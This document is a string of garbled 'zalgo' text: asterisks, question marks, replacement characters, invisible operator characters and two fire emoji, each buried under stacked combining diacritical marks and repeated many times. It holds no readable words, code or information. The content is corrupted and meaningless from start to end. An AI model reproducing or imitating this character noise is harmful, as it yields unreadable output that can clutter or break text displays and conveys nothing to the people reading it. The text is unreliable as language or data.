̯̱̪͍͉̟͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘̈́̾͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘̈́̾͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̛̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͝͡͝͝͝